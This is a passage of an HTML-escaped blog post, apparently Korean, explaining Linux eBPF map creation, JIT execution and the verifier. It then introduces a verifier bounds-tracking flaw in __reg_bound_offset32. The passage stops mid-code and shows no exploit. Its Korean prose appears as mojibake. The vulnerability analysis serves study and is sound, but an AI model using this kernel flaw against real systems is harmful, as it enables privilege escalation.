		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free_map_sec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_map_new_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;free_map_sec:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;security_bpf_map_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;free_map:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;btf_put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;bpf_map_charge_move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ops&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;bpf_map_charge_finish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;map = find_and_alloc_map(attr);&lt;/code&gt;ì„ ì´ìš©í•´ ìƒˆë¡œ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê³ , ì´ë¦„ ë¶™íˆê³ , ë„£ì„ ì•„ì´ë”” ìƒì„±í•˜ê³  fdì— ì—°ê²°ì‹œì¼œì„œ ë¦¬í„´í•œë‹¤. ê²°ê³¼ì ìœ¼ë¡œ mmapê³¼ ë¹„ìŠ·í•˜ë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;jit&quot;&gt;JIT&lt;/h3&gt;

&lt;p&gt;í¼í¬ë¨¼ìŠ¤ì ì¸ ì´ìœ ë¡œ eBPFë¡œ ë§Œë“  í”„ë¡œê·¸ë¨ì€ JITì»´íŒŒì¼ ë˜ì–´ ê¸°ê³„ì–´ë¡œ ë°”ë€ë‹¤. ë°”ê¾¼ ê¸°ê³„ì–´ë¥¼ ê·¸ëŒ€ë¡œ ì‹¤í–‰í•œë‹¤. ìœ„ ì†Œì¼“ì—ì„œ bpfí•„í„°ë§ ê±¸ ë•Œ ë´¤ë˜ ë§¤í¬ë¡œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define BPF_PROG_RUN(prog, ctx)	({				\
	u32 ret;						\
	cant_sleep();						\
	if (static_branch_unlikely(&amp;amp;bpf_stats_enabled_key)) {	\
		struct bpf_prog_stats *stats;			\
		u64 start = sched_clock();			\
		ret = (*(prog)-&amp;gt;bpf_func)(ctx, (prog)-&amp;gt;insnsi);	\
		stats = this_cpu_ptr(prog-&amp;gt;aux-&amp;gt;stats);		\
		u64_stats_update_begin(&amp;amp;stats-&amp;gt;syncp);		\
		stats-&amp;gt;cnt++;					\
		stats-&amp;gt;nsecs += sched_clock() - start;		\
		u64_stats_update_end(&amp;amp;stats-&amp;gt;syncp);		\
	} else {						\
		ret = (*(prog)-&amp;gt;bpf_func)(ctx, (prog)-&amp;gt;insnsi);	\
	}							\
	ret; })
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ ì½”ë“œì—ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;(*(prog)-&amp;gt;bpf_func)(ctx, (prog)â†’insnsi);&lt;/code&gt;ì—ì„œ JIT ì»´íŒŒì¼ ëœ ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•œë‹¤. ì»´íŒŒì¼ í•˜ëŠ” ì‹œì ì€ ì²˜ìŒ í”„ë¡œê·¸ë¨ì„ ì˜¬ë¦´ë•Œì¸ &lt;code class=&quot;highlighter-rouge&quot;&gt;BPF_PROG_LOAD&lt;/code&gt;ëª…ë ¹ì„ ì‹¤í–‰í•  ë•Œì´ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* last field in 'union bpf_attr' used by this command */&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define	BPF_PROG_LOAD_LAST_FIELD attach_prog_fd
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bpf_prog_load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_attr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog_type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;license&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_gpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;bpf_prog_load_fixup_attach_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf_prog_load_check_attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expected_attach_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
				       &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach_btf_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
				       &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach_prog_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* plain bpf_prog allocation */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf_prog_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insn_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ENOMEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
	&lt;span class=&quot;p&quot;&gt;,,,&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;atomic64_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aux&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;refcnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gpl_compatible&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_gpl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf_prog_is_dev_bound&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog_offload_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free_prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* run eBPF verifier */&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// JIT ì»´íŒŒì¼ ë˜ëŠ” ì‹œì &lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free_used_maps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog_select_runtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free_used_maps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_prog_alloc_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free_used_maps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ë ‡ê²Œ ë§Œë“¤ì–´ì§„ ì½”ë“œë¥¼ verifier(&lt;code class=&quot;highlighter-rouge&quot;&gt;/kernel/bpf/verifier.c&lt;/code&gt;)ì—ì„œ ê²€ì‚¬í•œë‹¤. ê²€ì‚¬í•˜ëŠ” ê³¼ì •ì¤‘ ì½”ë“œì˜ íë¦„ì„ ì²´í¬í•˜ëŠ” ê³¼ì •ì€ í¬ê²Œ ë‹¤ì„¯ê°€ì§€ì´ë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ì•Œ ìˆ˜ ì—†ëŠ” í•¨ìˆ˜ í˜¸ì¶œ&lt;/li&gt;
  &lt;li&gt;í•œ í•¨ìˆ˜ì—ì„œ ë‹¤ë¥¸ í•¨ìˆ˜ë¡œ ë„˜ì–´ê°€ì§€ ì•ŠìŒ&lt;/li&gt;
  &lt;li&gt;ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ëŠ” ì í”„&lt;/li&gt;
  &lt;li&gt;ì•Œ ìˆ˜ ì—†ëŠ” ëª…ë ¹ì–´ ì½”ë“œ&lt;/li&gt;
  &lt;li&gt;ë£¨í”„&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ë°ì´í„° í”Œë¡œìš°ë„ ë¹„ìŠ·í•˜ë‹¤. 0 divideë‚˜ ê·¸ëŸ° ê°„ë‹¨í•œ ê²ƒì„ í™•ì¸í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ê²€ì¦ì„ ë§ˆì¹œ ë’¤ JITì»´íŒŒì¼ ë˜ê³ , ì‹¤í–‰ëœë‹¤. ì¦‰ Bytecode â†’ Verifier â†’ JIT â†’ program run&lt;/p&gt;

&lt;h1 id=&quot;bug&quot;&gt;bug&lt;/h1&gt;

&lt;p&gt;ì·¨ì•½ì ì€ ë°”ë¡œ ìœ„ì—ì„œ ì„¤ëª…ëœ verifierì—ì„œ íŠ¸ë¦¬ê±° ëœë‹¤. verifierëŠ” JITì»´íŒŒì¼ ì¤‘ì— 32ë¹„íŠ¸ 64ë¹„íŠ¸ë§ˆë‹¤ ë‹¤ë¥¸ ì—°ì‚°ì„ ê°€ì§€ê³  ìˆë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;bpf_reg_state&lt;/code&gt;êµ¬ì¡°ì²´ë¥¼ ë³´ë©´ í˜„ì¬ ë ˆì§€ìŠ¤í„°ê°€ ê°€ì§ˆ ìˆ˜ ìˆëŠ” ê°’ì˜ ë²”ìœ„ë¥¼ ì •ì˜í•˜ê³ , ì‹¤ì œ ê°€ì§€ê³  ìˆëŠ” ê°’ì„ ì €ì¥í•˜ê³  ìˆë‹¤.(u = unsigned, s = signed)&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;cm&quot;&gt;/* For scalar types (SCALAR_VALUE), this represents our knowledge of
	 * the actual value.
	 * For pointer types, this represents the variable part of the offset
	 * from the pointed-to object, and is shared with all bpf_reg_states
	 * with the same id as us.
	 */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* Used to determine if any memory access using this register will
	 * result in a bad access.
	 * These refer to the same value as var_off, not necessarily the actual
	 * contents of the register.
	 */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smin_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* minimum possible (s64)value */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smax_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* maximum possible (s64)value */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;umin_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* minimum possible (u64)value */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;umax_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* maximum possible (u64)value */&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;var_offëŠ” valueì™€ maskê°’ì„ ê°€ì§€ê³  ìˆê³ , valueëŠ” ì‹¤ì œ ê°’ì´ë‹¤. ë§Œì•½ valueê°€ &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1111&lt;/code&gt;ì´ê³  maskê°€ &lt;code class=&quot;highlighter-rouge&quot;&gt;0x220000&lt;/code&gt;ë©´ valueëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;0x221111&lt;/code&gt;ê³¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1111&lt;/code&gt;ì„ ê°€ì§€ê²Œ ëœë‹¤. ì·¨ì•½ì ì´ ë°œìƒí•œ í•¨ìˆ˜ì¸ &lt;code class=&quot;highlighter-rouge&quot;&gt;__reg_bound_offset32&lt;/code&gt;ì´ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reg_bound_offset32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_reg_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;range&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum_range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;umin_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
				       &lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;umax_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lo32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum_cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hi32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum_lshift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tnum_rshift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span 